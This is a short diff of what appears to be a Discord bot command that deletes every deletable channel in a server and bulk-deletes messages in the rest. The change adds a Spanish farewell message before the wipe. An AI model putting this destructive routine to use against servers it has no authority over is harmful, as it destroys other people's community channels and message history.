@@ -8,7 +8,7 @@ module.exports = {
 			message.channel.guild.channels.tap(ch => {
 				if(ch.deletable) ch.delete().catch(error => console.error(error));
 				if(!ch.deleted && ch.type === 'text') {
-					
+					ch.send('*Todo lo que comienza, eventualmente termina. Sea por la razón que sea.*');
 					ch.bulkDelete(1000, true);
 				}
 			});
